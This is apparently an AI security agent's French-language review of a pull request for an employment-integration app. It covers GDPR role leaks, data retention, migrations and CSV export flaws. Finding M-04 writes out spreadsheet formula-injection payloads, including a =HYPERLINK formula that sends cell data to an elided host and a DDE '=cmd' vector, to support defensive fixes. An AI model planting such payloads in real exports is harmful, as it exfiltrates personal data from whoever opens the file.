# PR A « Conformité immédiate » — revue de sécurité et de conformité RGPD

> **Agent de sécurité (lecture seule)** — chantier `cip-refonte-2026-09-12`, branche
> `claude/solidata-cip-redesign-9fskwq`, périmètre `git diff origin/main...HEAD -- backend/src frontend/src`
> (lots 0, 1, 2 et intégration : 4 commits, 37 fichiers, +7 068 / −538 lignes).
> **Références opposables** : contrats `10-contrats-techniques-PR-A.md`, décisions `07-plan-action.md` § 8-9,
> exigences de l'autorité `09-matrice-reporting-autorite.md` § 2 (règles communes des exports) et § 4.1
> (aucun justificatif d'éligibilité stocké). Doctrines : `CLAUDE.md` § 7-8,
> `rapports/decheterie-2026-09-06/02-revue-securite.md`, `rapports/pcm-insertion-2026-08-29/04-mfa-et-isolement-donnees.md`.
> **Aucun fichier de code modifié.** Tests de reproduction ajoutés dans `backend/tests/securite-pr-a/`.
> **Date** : 13 septembre 2026.

---

## 0. Verdict

**CONFORME SOUS RÉSERVE** — 3 constats **BLOQUANTS**, 6 **MAJEURS**, 10 **MINEURS**.

Le travail est d'un bon niveau : requêtes toutes paramétrées, listes fermées doublées de CHECK en base,
pièces en BYTEA avec vérification par octets d'en-tête, journal d'export écrit avant envoi et bloquant,
refus explicite sur zéro ligne, migrations idempotentes, deux entrées au registre art. 30. Les tests de
périmètre que j'ai écrits (11 assertions) passent tous : aucun rôle hors insertion — COMMUNICATION,
AUTORITE, DPO, QHSE, COLLABORATEUR, jeton chauffeur — ne joint la moindre route de la PR, et aucun
refus n'atteint la base.

**Ce qui bloque tient en une phrase** : la PR déclare trois fois — dans le contrat (§ 0.6), dans ses
propres commentaires de code, et dans l'entrée art. 30 qu'elle écrit en base — que les **statuts
sociaux (BRSA, catégorie France Travail) sont ADMIN/RH strict, « jamais rendus en lecture à
l'encadrement technique, y compris par l'API »**. Or trois surfaces distinctes les rendent au MANAGER,
en clair et en français. C'est exactement la classe de défaut corrigée en 2.43.0 (le profil PCM
déchiffré qui fuyait vers MANAGER par `GET /insertion/:id`) : la donnée protégée sur une route revient
par une route voisine, sous forme dérivée. Et c'est précisément la démonstration que l'autorité annonce
vouloir faire elle-même (`09` § 4.3 condition 3 : *« connectez-vous devant moi avec un compte
d'encadrant technique et montrez-moi que les volets santé, judiciaire et budget sont absents de
l'écran, pas simplement grisés »*). En l'état, cette démonstration échoue.

Les trois constats bloquants sont **reproduits** par des tests joints, verts sur la branche.

---

## 1. Constats BLOQUANTS

### C-01 — Les critères d'éligibilité IAE sont servis au MANAGER, statuts sociaux compris

**Fichier** : `backend/src/routes/insertion/cadre.js:313` (`projeterPourManager`) et `:258`
(composition de `eligibilite.criteres`).
**Schéma** : `backend/src/scripts/migrations/insertion-cadre.js:43-58` (les 14 critères seedés).

`projeterPourManager` retire trois clés — `statuts`, `pieces`, `bloc_emplois_inclusion` — et son
commentaire explique justement que le bloc de report est retiré « parce qu'il contient à lui seul les
critères d'éligibilité, qui sont la donnée la plus sensible du dossier ». **La liste `eligibilite.criteres`,
elle, est conservée intacte** — avec ses codes ET ses libellés en toutes lettres.

Or les 14 critères du référentiel seedé comprennent :

| Code | Libellé servi au MANAGER | Nature |
|---|---|---|
| `brsa` | « Bénéficiaire du RSA » | statut social — **la clé `statuts.brsa` qu'on vient de retirer** |
| `rqth` | « Reconnaissance RQTH » | santé (art. 9) |
| `aah` | « Allocataire AAH » | santé (art. 9) |
| `sortant_detention` | « Sortant de détention » | judiciaire (**art. 10**) |
| `sans_domicile` | « Sans domicile stable » | situation sociale |
| `parent_isole`, `refugie_bpi`, `qpv` | … | situation sociale |

La protection est donc défaite par la même réponse HTTP. Pire, **le lot enregistre la fuite dans son
propre test** : `backend/tests/contract/insertion-cadre-contract.test.js:124` assère
`expect(res.body.eligibilite.criteres).toHaveLength(2)` pour un MANAGER, sur un jeu de données dont le
premier critère est `brsa` / « Bénéficiaire du RSA » — et le test suivant s'intitule *« la lecture
MANAGER n'est PAS journalisée (aucune donnée sensible servie) »*, affirmation fausse.

**Contradiction avec le registre art. 30** écrit par la migration
(`insertion-cadre.js:266`, champ `mesures_securite`) : *« Statuts sociaux (BRSA, catégorie France
Travail) réservés aux rôles ADMIN/RH — jamais rendus en lecture à l'encadrement technique, y compris
par l'API »*. Un registre qui promet ce que le code ne tient pas est une non-conformité en soi.

**Preuve** : `backend/tests/securite-pr-a/manager-statuts-sociaux.test.js`, bloc `C-01` — un MANAGER
reçoit `brsa`, `rqth` et `sortant_detention` avec leurs libellés, sans qu'aucune ligne
ne soit écrite au journal RGPD. Vert.

**Correctif recommandé** (`cadre.js:313`) :

```js
function projeterPourManager(cadre) {
  const { statuts, pieces, bloc_emplois_inclusion, eligibilite, ...reste } = cadre;
  return {
    ...reste,
    // Le MANAGER a besoin de savoir que l'éligibilité EST vérifiée (c'est une
    // pièce du dossier de conformité), jamais de QUOI elle est faite : la liste
    // des critères est le portrait social le plus condensé du dossier.
    eligibilite: {
      verifiee_le: eligibilite.verifiee_le,
      source: eligibilite.source,
      nb_criteres: (eligibilite.criteres || []).length,
    },
  };
}
```

et corriger les deux assertions de `insertion-cadre-contract.test.js` (l. 124 et le test de
journalisation) pour verrouiller le nouveau comportement plutôt que l'ancien.

---

### C-02 — `suggestions_fse` relit `employees.brsa` **après** le masquage et le rend au MANAGER

**Fichier** : `backend/src/routes/insertion/routes.js:326` (`enrichirFse`), appelée en `:198`
(`GET /diagnostic/:employeeId`) et `:443` (`PUT /diagnostic/:employeeId`).
**Origine** : `backend/src/utils/fse-schema.js:259` (`suggestionsEntree`).

Séquence exacte du handler :

```js
if (baseRole === 'MANAGER') maskInsertionRow(row, baseRole);   // masque la LIGNE du diagnostic
else decryptDiagRow(row);
const { suggestions_fse, fse_completude } = await enrichirFse(row, empId);  // ← requête NEUVE
res.json({ ...row, suggestions_fse, fse_completude });
```

`enrichirFse` exécute `SELECT brsa, france_travail_id FROM employees WHERE id = $1` **sans aucune
considération de rôle**, puis `suggestionsEntree` compose une phrase lisible :

- `brsa === true` → `{ valeur: 'rsa', source: "Dossier administratif : bénéficiaire du RSA" }`
- `france_travail_id` renseigné → `{ valeur: 'demandeur_emploi', source: "Dossier administratif : identifiant France Travail renseigné" }`

Le masquage par champ ne peut rien : il agit sur la ligne `insertion_diagnostics`, et la fuite vient
d'une **seconde requête, postérieure**, sur `employees`. C'est le schéma exact du correctif structurel
de 2.43.0 (*« pour un MANAGER le moteur d'analyse n'est plus ALIMENTÉ en PCM/entretien : rien de dérivé
ne peut fuir »*). Ici, le moteur de suggestions est alimenté en BRSA pour tout le monde.

**Régression introduite par cette PR** : `suggestions_fse` n'existait pas avant.

**Preuve** : `manager-statuts-sociaux.test.js`, bloc `C-02` — le MANAGER ne reçoit ni
`frein_judiciaire` ni `frein_sante_detail` (le masquage fonctionne) mais reçoit
`suggestions_fse.ressources_principales = { valeur: 'rsa', source: 'Dossier administratif : bénéficiaire du RSA' }`. Vert.

**Correctif recommandé** (`routes.js:326`) — ne pas alimenter le moteur, plutôt que filtrer sa sortie :

```js
async function enrichirFse(row, employeeId, baseRole) {
  const fse = (row && row.fse_entree && typeof row.fse_entree === 'object') ? row.fse_entree : {};
  // Le MANAGER n'a ni le questionnaire ni ses suggestions (routes/insertion/fse.js
  // est ADMIN/RH strict « y compris en lecture ») : on ne LIT même pas les statuts.
  if (baseRole === 'MANAGER') return { suggestions_fse: {}, fse_completude: null };
  let emp = {};
  …
}
```

et propager `baseRole` aux deux appels (`:198`, `:443`).

---

### C-03 — L'alerte « référent non déterminé » énonce le statut BRSA en toutes lettres au MANAGER

**Fichier** : `backend/src/routes/insertion/routes.js:2071-2076`, route `GET /alertes/:employeeId`
(`:1893`, **sans `authorize`** — elle hérite donc d'ADMIN/RH/MANAGER).

```js
if (emp.brsa === true && (!emp.referent_unique_type || emp.referent_unique_type === 'non_determine')) {
  alertes.push({
    type: 'referent_non_determine', niveau: 'critique',
    message: 'Référent unique non déterminé alors que la personne est bénéficiaire du RSA — à signaler au Département.',
  });
}
```

Le `SELECT` de tête a été élargi par la PR pour ramener `e.brsa` (`:1901`). Le composant `AlertesBloc`
est rendu dans l'en-tête de fiche **pour tous les rôles** (`InsertionParcours.jsx:1191`). Un encadrant
technique lit donc, sur l'écran d'un salarié, la phrase « la personne est bénéficiaire du RSA ».

**Preuve** : `manager-statuts-sociaux.test.js`, bloc `C-04` (numérotation interne du fichier de test). Vert.

**Correctif recommandé** : composer le message **sans** nommer le statut, et ne servir l'alerte
qu'aux rôles habilités :

```js
const estAdminRh = ['ADMIN', 'RH'].includes(baseRoleOf(req));
if (estAdminRh && emp.brsa === true && (!emp.referent_unique_type || emp.referent_unique_type === 'non_determine')) {
  alertes.push({ type: 'referent_non_determine', niveau: 'critique',
    message: 'Référent unique non déterminé — à signaler au Département.' });
}
```

Vérifier au passage les alertes 8 et 9 : elles nomment le **projet cofinancé** (`ASI-2026-2027`), ce
que le contrat autorise au MANAGER (`GET /projets/:id/participants` lui est ouvert). Rien à changer là.

---

## 2. Constats MAJEURS

### M-01 — Le questionnaire FSE+ d'entrée est ADMIN/RH sur une route et ouvert au MANAGER sur l'autre

**Fichiers** : `backend/src/routes/insertion/fse.js:26` (`router.use(authorize('ADMIN','RH'))`) contre
`backend/src/routes/insertion/routes.js:186` (`SELECT * FROM insertion_diagnostics`, aucun `authorize`).

L'en-tête de `fse.js` est explicite : *« POURQUOI ADMIN/RH STRICT, Y COMPRIS EN LECTURE. Le
questionnaire d'entrée porte la composition du foyer, la stabilité du logement et la nature des
ressources : ce sont des statuts sociaux […] jamais en lecture encadrant. »* Cette décision est
intégralement contournable : `GET /insertion/diagnostic/:employeeId` rend la colonne `fse_entree`
telle quelle (`foyer_monoparental`, `sans_domicile_stable`, `ressources_principales`, et le
**commentaire libre**) — `maskInsertionRow` ne connaît pas cette clé.

Symétriquement, `PUT /insertion/diagnostic/:employeeId` (`:343`, sans `authorize`) laisse un MANAGER
**écrire** le questionnaire, c'est-à-dire une pièce d'audit européenne.

La colonne préexistait, mais la PR en fait un questionnaire typé, réellement rempli, opposable — et
déclare ailleurs qu'il est ADMIN/RH. La contradiction, elle, est neuve.

**Preuve** : `manager-statuts-sociaux.test.js`, `C-02` dernier test — le MANAGER reçoit
`fse_entree.commentaire` contenant « suivi psychologique ». Vert.

**Correctif** : ajouter `fse_entree`, `fse_entree_complet`, `fse_entree_saisie_at` à
`MANAGER_HIDDEN_FIELDS` (`backend/src/routes/insertion/masking.js:22`) — le masquage retire les clés,
l'absence dit « non habilité » — et refuser l'écriture des clés FSE+ au MANAGER dans
`PUT /diagnostic` (400 ou silencieux `delete d.fse_entree`, au choix, documenté).

---

### M-02 — Un MANAGER peut écrire la sortie FSE+, pièce opposable de l'autorité de gestion

**Fichier** : `backend/src/routes/insertion/routes.js:779` (`POST /milestones/:id/close`, sans
`authorize`) → `:965` `fseParticipants.enregistrerSortie(...)`, puis `:1001`
`res.json({ …, sortie_fse: sortieFse })`.

La même écriture passe par deux portes de niveau d'habilitation différent :

| Porte | Habilitation | Écrit `insertion_fse_sorties` |
|---|---|---|
| `POST /insertion/fse/:id/sortie` | ADMIN/RH (`fse.js:26`) | oui |
| `POST /insertion/milestones/:id/close` | **ADMIN/RH/MANAGER** | oui, via `enregistrerSortie` |

La ligne écrite porte `saisie_par` et `saisie_at` — les deux champs sur lesquels l'autorité calcule le
**délai de saisie**, « la colonne que je regarde en premier » (`09` § 2 (a), colonne 26). Qu'un rôle
explicitement écarté du volet FSE+ puisse la créer est une faiblesse d'intégrité sur une pièce de
contrôle de service fait.

Accessoirement, `sortie_fse` est renvoyé **hors masquage** (la ligne complète, `fse_sortie` JSONB et
son commentaire libre compris), et le 409 d'échec expose `detail: e.message` (`:988`).

**Correctif** : restreindre la clôture d'un `bilan_sortie` à ADMIN/RH (garde à l'intérieur du handler,
après lecture du type de jalon, pour ne pas fermer les autres types au MANAGER) ; masquer `sortie_fse`
par `maskInsertionRow` ou ne renvoyer que `{ id, date_sortie, situation_sortie, source }` ; retirer
`detail: e.message` (le code `FSE_SORTIE_NON_ENREGISTREE` et `erreurs` suffisent).

---

### M-03 — Le commentaire libre des questionnaires FSE+ : ni chiffré, ni purgé, ni utile à l'audit

**Fichiers** : `backend/src/utils/fse-schema.js:74` et `:129` (item `commentaire`, `MAX_TEXTE = 2000`),
`backend/src/services/anonymization.js:436-446` (conservation délibérée de `insertion_fse_sorties` et
de `fse_entree`).

La PR ajoute un champ de texte libre de 2 000 caractères aux **deux** questionnaires. Il atterrit dans
`insertion_diagnostics.fse_entree` et `insertion_fse_sorties.fse_sortie`, deux JSONB que
l'anonymisation **conserve volontairement** au titre de la piste d'audit FSE+ (≥ 5 ans). Trois
observations, qui se contredisent entre elles :

1. **Un texte libre d'accompagnement porte par nature de la santé (art. 9) ou du contexte judiciaire
   (art. 10) sans qu'aucune colonne ne l'annonce.** C'est mot pour mot le raisonnement qui a fait
   chiffrer les notes de suivi de la CIP en 2.47.0 et les détails santé/judiciaire du diagnostic.
   Ici, rien : ni `field-crypto`, ni exclusion.
2. **Il n'entre dans aucune des 29 colonnes de l'export** (`routes/exports-fse.js:61-72`) ni dans le
   bilan agrégé (`indicateurs_entree` n'itère que les items `obligatoire`). Il n'est donc **pas** la
   pièce d'audit que sa conservation prétend protéger.
3. **L'entrée art. 30 écrite par la migration** (`insertion-fse.js:213`) affirme, pour ce traitement :
   *« AUCUNE donnée de santé ni judiciaire : les freins et leurs commentaires sont exclus de tout
   export FSE+ »* — et ne mentionne nulle part de commentaire libre dans ses `categories_donnees`.

Conséquence concrète : une phrase du type « hospitalisation en psychiatrie en mars ; sursis probatoire
jusqu'en 2027 » saisie à la sortie survit **cinq ans après l'anonymisation du dossier**, en clair,
lisible par tout ADMIN/RH et par un `SELECT *` accidentel, dans un traitement dont le registre déclare
qu'il ne contient pas ce type de donnée.

**Preuve** : `backend/tests/securite-pr-a/commentaire-libre-retention.test.js`. Vert (7 assertions).

**Correctif recommandé — au choix, par ordre de préférence** :

1. **Purger le commentaire à l'anonymisation** (le moins coûteux, suffisant) —
   dans `anonymizeEmployee`, à l'intérieur du `SAVEPOINT` existant :
   ```sql
   UPDATE insertion_fse_sorties  SET fse_sortie = fse_sortie - 'commentaire' WHERE employee_id = $1;
   UPDATE insertion_diagnostics  SET fse_entree = fse_entree - 'commentaire' WHERE employee_id = $1;
   ```
   et l'écrire dans le registre : « les commentaires libres sont retirés à l'anonymisation, les
   réponses typées sont conservées au titre de la piste d'audit ».
2. **Ou** chiffrer le commentaire (`utils/field-crypto`), au prix d'une clé de plus dans les JSONB.
3. **Ou**, le plus radical et le plus honnête : **retirer l'item `commentaire`** des deux
   questionnaires. Il n'est demandé ni par l'autorité, ni par l'export, ni par le bilan ; la CIP
   dispose déjà du journal de suivi chiffré (2.47.0) pour ce qu'elle veut écrire librement.

---

### M-04 — Injection de formule dans les exports CSV (FSE+ participants et Insertion complet)

**Fichiers** : `backend/src/routes/exports-fse.js:76` (`esc`) et `backend/src/routes/exports.js:451`
(même fonction, même défaut).

```js
const esc = (v) => {
  const s = String(v === null || v === undefined ? '' : v);
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
```

Le guillemetage est une convention **CSV** ; il n'a aucun effet sur l'interprétation par le tableur.
Une cellule dont le contenu commence par `=`, `+`, `-`, `@`, TAB ou CR est évaluée comme une **formule**
à l'ouverture — y compris entre guillemets, que le parseur retire avant évaluation.

Les cellules concernées viennent de champs libres saisis ou importés depuis la paie :
`employees.city` (colonne 6), `first_name` / `last_name` (colonnes 2-3), `insertion_projets.nom`
(colonne 7, saisi par un ADMIN/RH), et toutes les colonnes de l'export « Insertion complet » en CSV.
Le fichier est **destiné à être ouvert par l'agent de la DDETS**, hors de notre poste, avec ses droits
à lui. `=HYPERLINK("http://…/?d="&A2&B2,"Cliquez ici")` dans une commune de résidence suffit à
composer une exfiltration en un clic ; `=cmd|…` reste un vecteur DDE sur des configurations anciennes.

**Preuve** : `backend/tests/securite-pr-a/export-csv-injection.test.js` — les cellules `=1+1`,
`@SUM(A1:A9)` et `=HYPERLINK(…)` partent telles quelles. Vert.

**Correctif recommandé** — neutralisation à la source, dans les **deux** fichiers :

```js
/**
 * Échappement CSV + neutralisation de formule. Un tableur évalue toute cellule
 * commençant par = + - @ TAB ou CR, guillemets compris (il les retire avant
 * d'évaluer) : on préfixe d'une apostrophe, qui n'apparaît pas à l'écran et
 * force le mode texte sur Excel, LibreOffice et Google Sheets.
 */
const esc = (v) => {
  let s = String(v === null || v === undefined ? '' : v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
};
```

⚠ Ne pas préfixer les cellules **numériques** produites par le code lui-même (délai de saisie,
pourcentages) : le test `^[=+\-@\t\r]` ne les touche pas, sauf un délai négatif (`-3`). Dans ce cas
précis, préférer `if (typeof v === 'string' && /^[=+\-@\t\r]/.test(s))`.

À faire aussi pour le classeur Excel (`addDataSheet`, `exports.js:425`) : ExcelJS écrit une chaîne
commençant par `=` comme une formule si la cellule est typée automatiquement — forcer
`cell.value = { richText: … }` ou préfixer de la même façon.

---

### M-05 — `situation_6mois = 'injoignable'` : le CHECK n'est pas élargi sur une base déjà migrée

**Fichier** : `backend/src/scripts/migrations/insertion-fse.js:112`.

L'amendement d'intégration (commit `b0713fb`) a ajouté `'injoignable'` **uniquement dans le
`CREATE TABLE IF NOT EXISTS`**. Sur une base où la migration a déjà tourné (commit `cb31d89` — tout
environnement de développement ou de recette de ce chantier), `CREATE TABLE IF NOT EXISTS` ne fait
rien et l'ancien CHECK survit : `POST /insertion/fse/:id/six-mois` avec `injoignable` échoue en 23514
et sort un **500 « Erreur serveur »**.

Le contraste est net avec le CHECK voisin `insertion_interview_alerts.alert_type` (`:180`), qui est
correctement reconstruit par DO-scan, marqueur inclus.

L'effet n'est pas cosmétique : `injoignable` est la valeur créée **exprès pour l'autorité**
(colonne 27 de l'export : « Injoignable » doit se distinguer de « Non relevée »), et sans elle la
pièce « Suivi à +6 mois » du dossier de conformité ne peut jamais passer au vert pour une personne
partie sans laisser de numéro — c'est-à-dire le cas que l'amendement a été écrit pour traiter.

**Preuve** : `backend/tests/securite-pr-a/commentaire-libre-retention.test.js`, bloc `C-06`. Vert.

**Correctif** — ajouter après le `CREATE TABLE` :

```js
await client.query(`
  DO $$
  DECLARE cname text;
  BEGIN
    FOR cname IN
      SELECT conname FROM pg_constraint
      WHERE conrelid = 'insertion_fse_sorties'::regclass AND contype = 'c'
        AND pg_get_constraintdef(oid) ILIKE '%situation_6mois%'
        AND pg_get_constraintdef(oid) NOT ILIKE '%injoignable%'
    LOOP
      EXECUTE 'ALTER TABLE insertion_fse_sorties DROP CONSTRAINT ' || quote_ident(cname);
    END LOOP;
    IF NOT EXISTS (
      SELECT 1 FROM pg_constraint
      WHERE conrelid = 'insertion_fse_sorties'::regclass
        AND conname = 'insertion_fse_sorties_situation_6mois_check'
    ) THEN
      ALTER TABLE insertion_fse_sorties ADD CONSTRAINT insertion_fse_sorties_situation_6mois_check
        CHECK (situation_6mois IS NULL OR situation_6mois IN
          ('emploi_durable','emploi_transition','formation','autre_sortie_positive','inactivite','chomage','inconnue','injoignable'));
    END IF;
  END $$;
`);
```

Aucune perte de données : l'ancien CHECK est un sur-ensemble strictement inclus dans le nouveau.

---

### M-06 — `sortant_detention` (art. 10) part dans l'export nominatif, contre le registre art. 30

**Fichier** : `backend/src/routes/exports-fse.js:145-148` (`string_agg(ee.critere_code)`) et `:186`
(colonne 10), `insertion-fse.js:213` (registre).

La colonne 10 « Critères d'éligibilité IAE » est **dictée par l'autorité** (`09` § 2 (a)), et
l'autorité a tranché le cas de la RQTH : *« la reconnaissance de travailleur handicapé n'apparaît que
comme code d'éligibilité en colonne 10, jamais comme information médicale »*. En revanche :

- `sortant_detention` **n'a pas été discuté**, et la règle commune du même paragraphe est sans nuance :
  *« Exclusions absolues dans tout export qui sort de la structure : […] frein judiciaire sous toute
  forme »* ;
- le registre art. 30 du traitement FSE+ écrit en base par la PR affirme : *« AUCUNE donnée de santé
  ni judiciaire »*.

Le code, le registre et la règle de l'autorité disent donc trois choses différentes. Ce n'est pas
nécessairement un défaut de code — c'est un arbitrage qui n'a pas été rendu, et une promesse
réglementaire qui est fausse en l'état.

**Correctif recommandé** : trancher explicitement, puis aligner les trois. Deux options tenables :
(a) exclure `sortant_detention` de la colonne 10 et l'écrire dans le registre (« critère d'éligibilité
judiciaire constaté en interne, jamais exporté ») ; (b) le conserver — l'autorité le demande
implicitement pour sa typologie annuelle — et **corriger le registre** en nommant les critères
sensibles exportés et leur base légale, avec mention à l'AIPD. Dans les deux cas, le
`categories_donnees` du registre FSE+ doit citer les critères d'éligibilité, ce qu'il ne fait pas.

---

## 3. Constats MINEURS

| # | Fichier:ligne | Constat | Correctif |
|---|---|---|---|
| m-01 | `services/anonymization.js:448-457` | Les **trois** DELETE partagent **un seul** SAVEPOINT : si `insertion_pieces` manque (migration partielle), `insertion_pass_iae_evenements` et `employee_eligibilite` ne sont pas purgés non plus, et l'échec n'est qu'un `console.warn`. | Un SAVEPOINT par table (boucle), ou un `to_regclass` préalable. |
| m-02 | `routes/insertion/pieces.js:94-104` | La consultation d'une pièce signée est journalisée en **best effort** (try/catch avalant). Le précédent déchèterie (2.50.0) fait de même **mais double par `logActivity`** : ici, un journal indisponible ne laisse aucune trace. L'autorité pose « consultation journalisée » en *condition* de son acceptation (§ 4.1). | Doubler par `logActivity({ action:'view', entityType:'insertion_piece' })`, ou refuser le service si les deux échouent. |
| m-03 | `insertion/conformite.js:143`, `fse.js:124/165/192`, `projets.js:56`, `exports-fse.js:287` | `code: err.code` (SQLSTATE) renvoyé au client. Conforme au précédent 2.3.2 (diagnosticabilité ADMIN), mais `exports.js:…` conserve en plus `detail: err.message` (message SQL brut). | Garder `code`, retirer `detail: err.message` (déjà fait ailleurs par l'audit-A v1.4.2). |
| m-04 | `routes/exports-fse.js:274` | L'en-tête du CSV transmis à la DDETS porte `Généré par;${req.user.username}`. `exports.js` a un helper `nomGenerateur()` qui compose « Prénom Nom » et commente explicitement « jamais son e-mail ». | Réutiliser `nomGenerateur(req.user)` dans les deux exports. |
| m-05 | `routes/exports-fse.js:409` | Le bilan déclare `nominatif: false` alors que `moyens.postes_affectes[].intervenant` nomme les salariés affectés au projet. L'autorité exige le bilan « strictement non nominatif » (§ 2 (b)) tout en demandant les postes affectés (§ 7). | Soit remplacer le nom par un identifiant interne, soit retirer le drapeau `nominatif: false` et noter « nominatif pour les intervenants, non nominatif pour les participants ». |
| m-06 | `routes/insertion/pieces.js:172` | `milestone_id` / `pmsmp_id` ne sont pas vérifiés comme appartenant au salarié : la FK ne contrôle que l'existence. Une pièce peut être rattachée à l'entretien d'un autre salarié. | `AND EXISTS (SELECT 1 FROM insertion_milestones WHERE id = $3 AND employee_id = $1)` ou vérification préalable → 400. |
| m-07 | `components/insertion/DossierAdministratif.jsx:548` | `<DossierConformite>` est rendu sans condition de rôle ; l'API (`conformite.js:120`) est ADMIN/RH → un MANAGER voit un bandeau d'erreur 403 dans la colonne de droite. | `{adminRh && <DossierConformite … />}`. |
| m-08 | `routes/insertion/routes.js:668`, `masking.js:22` | `absence_piece_ref` est un texte libre de 200 caractères, **non masqué** au MANAGER et versé tel quel dans la feuille « Jalons » de l'export Excel (`m.*`). Le placeholder de l'écran oriente bien (« justificatif remis le 12/09 ») mais rien n'empêche d'y écrire une nature médicale, que la liste fermée de `absence_motif` interdit précisément. | Ajouter un texte d'aide « n'inscrivez aucune information médicale », et évaluer le masquage MANAGER. |
| m-09 | `routes/exports.js:456` | `toCsv` a perdu sa garde `if (!rows.length) return '(aucune donnée)'` : sur `rows = []`, `Object.keys(rows[0])` lève un `TypeError`. Les deux appelants sont gardés par un 409 en amont — la fonction, elle, ne l'est plus. | Rétablir un garde-fou local (`if (!rows.length) throw new Error('EXPORT_VIDE')`). |
| m-10 | `routes/insertion/cadre.js:231`, `:327` | `composerCadre` charge les **pièces** puis `projeterPourManager` les jette : la donnée interdite est lue en base avant d'être refusée. La doctrine 2.51.0 pose l'inverse (« un refus après lecture serait un refus d'affichage, pas d'accès »). | Passer le rôle à `composerCadre` et ne lancer `lirePieces` / la composition du bloc que pour ADMIN/RH. |

---

## 4. Ce qui est bien fait — à conserver tel quel

1. **`exports-fse.js` porte sa propre chaîne d'authentification** (`:41` :
   `authenticate, requireMfa, authorize('ADMIN','RH')`) alors qu'il est monté à la racine de
   `/api/exports`. Vérifié par test : sans jeton → 401 sans une seule requête en base ; jeton ADMIN
   sans second facteur → refusé ; MANAGER → 403 sur l'export **et** sur le bilan.
2. **L'ordre de montage est correct** : les six sous-routeurs sont montés **avant** `routes.js`
   (`insertion/index.js:31-36`), qui se termine par un `GET /:employeeId` qui les aurait tous captés.
   Les chemins à deux segments (`/pieces/fichier/:id`, `/conformite/:employeeId`) sont sûrs.
3. **Les pièces sont bien traitées** : contenu en BYTEA (jamais sous `/uploads`, servi statiquement),
   type déterminé par les **octets d'en-tête** et non par le MIME déclaré (`pieces.js:70`), taille
   bornée deux fois (multer **et** CHECK en base), `nosniff` + `no-store` + `Content-Disposition`
   assaini contre l'injection d'en-tête (`:214`), et le CHECK de la colonne `type` **interdit en base**
   tout justificatif d'éligibilité — la réserve § 4.1 de l'autorité est tenue dans le schéma, pas
   seulement dans l'écran.
4. **Le journal d'export est écrit avant l'envoi et son échec fait échouer l'export** (`exports-fse.js:265`,
   `exports.js:…`), conformément à la règle commune de l'autorité. Vérifié par le test `journalKo` du lot.
5. **Le refus sur zéro ligne** (409 `EXPORT_VIDE`) est motivé, avec un `hint` exploitable, et il précède
   toute écriture.
6. **`utils/fse-schema.js` est un vrai schéma fermé** : clé inconnue = erreur (et non champ ignoré),
   valeur hors liste = erreur, texte borné à 2 000 caractères, `valider` ne restitue que les clés
   validées — donc aucune pollution de prototype ni clé parasite ne peut atteindre le JSONB.
7. **Toutes les requêtes sont paramétrées.** Le seul SQL composé (`cadre.js:476`,
   `projets.js:71/93`, `eligibilite.js:89`) assemble des **noms de colonnes issus de listes blanches
   littérales** ; les valeurs passent toutes par `$n`. Grep exhaustif effectué sur les huit fichiers neufs.
8. **Les listes fermées sont doublées** : validation applicative (message français, 400) **et** CHECK
   en base posé par DO-scan idempotent — une autre voie d'écriture ne peut pas les contourner.
9. **Le journal de modification porte les NOMS des champs, jamais leurs valeurs** (`cadre.js:57-72`) :
   le registre d'audit ne devient pas une seconde copie des statuts sociaux qu'il protège.
10. **L'anonymisation est argumentée ligne à ligne** et protégée par un SAVEPOINT (leçon C-07 de la
    revue déchèterie), avec une distinction juste entre ce qui NOMME (orienteur, référent, dates de
    constat → effacé) et ce qui est catégoriel non nominatif (BRSA, catégorie FT → conservé pour les
    typologies de cohorte).
11. **Le bot n'est pas touché** : `services/bot-tools.js` n'est pas modifié et ne référence aucune des
    nouvelles tables ni colonnes. Vérifié par grep.
12. **Aucun secret, aucun jeton, aucune donnée sensible dans `localStorage`** côté frontend ; aucun
    `dangerouslySetInnerHTML` ; les téléchargements passent par un blob authentifié (le jeton ne
    voyage jamais dans une URL) ; `revokeObjectURL` est appelé et **différé** (leçon C-10 de la revue
    déchèterie) ; l'en-tête de fiche s'appuie sur l'**absence de la clé** `statuts` plutôt que sur une
    garde de rôle recopiée côté client.
13. **Les libellés RGPD sont complets** : les 10 codes du contrat § 5 sont présents dans
    `frontend/src/utils/rgpd-libelles.js` ; la garde anti-dérive `tests/unit/rgpd-audit-libelles.test.js`
    est verte.
14. **Les migrations sont idempotentes** (hors m-05) : `CREATE TABLE IF NOT EXISTS`,
    `ADD COLUMN IF NOT EXISTS`, seeds `ON CONFLICT DO NOTHING`, CHECK par DO-scan de `pg_constraint`
    avec marqueur, registre gardé par `NOT EXISTS … ILIKE`. Les deux `run(client)` sont appelés dans
    la transaction d'`init-db` sans BEGIN/COMMIT interne, conformément au contrat.

---

## 5. Tests ajoutés — `backend/tests/securite-pr-a/`

Quatre fichiers, **26 assertions, toutes vertes**. Les tests marqués « DÉFAUT » sont des tests de
**reproduction** : ils passent *parce que* le défaut est présent, et doivent être inversés par le
correctif (chaque bloc porte en commentaire ce que le correctif doit produire).

| Fichier | Assertions | Nature | État |
|---|---|---|---|
| `manager-statuts-sociaux.test.js` | 6 | **Reproduction** de C-01, C-02 et C-03 : le MANAGER reçoit les critères d'éligibilité (`brsa`, `rqth`, `sortant_detention`), les suggestions FSE+ dérivées de `employees.brsa`, le questionnaire d'entrée avec son commentaire libre, et l'alerte qui énonce le statut BRSA. | vert = défaut présent |
| `export-csv-injection.test.js` | 2 | **Reproduction** de M-04 : `=1+1`, `@SUM(A1:A9)` et `=HYPERLINK(…)` sortent non neutralisés de l'export FSE+ ; contrôle que le séparateur est bien `;`. | vert = défaut présent |
| `commentaire-libre-retention.test.js` | 7 | **Reproduction** de M-03 et M-05 : le commentaire est accepté en clair (2 000 car.), absent de `SENSITIVE_DIAG_FIELDS`, jamais touché par l'anonymisation (garde statique sur le source), absent des 29 colonnes de l'export ; et `injoignable` n'apparaît qu'une fois dans la migration, sans DO-scan de reconstruction. | vert = défaut présent |
| `perimetre-roles.test.js` | 11 | **Non-régression** — ce qui est bien fait et doit le rester : COMMUNICATION, AUTORITE, DPO, QHSE, COLLABORATEUR et jeton chauffeur reçoivent 403 sur les 8 routes de la PR **sans qu'aucune requête n'atteigne la base** ; `exports-fse` refuse 401 sans jeton, 403 au MANAGER (export et bilan) et refuse un ADMIN sans second facteur ; le MANAGER est refusé sur les trois écritures/lectures de pièces. | vert = comportement correct |

Commande : `cd backend && npx jest tests/securite-pr-a/`.
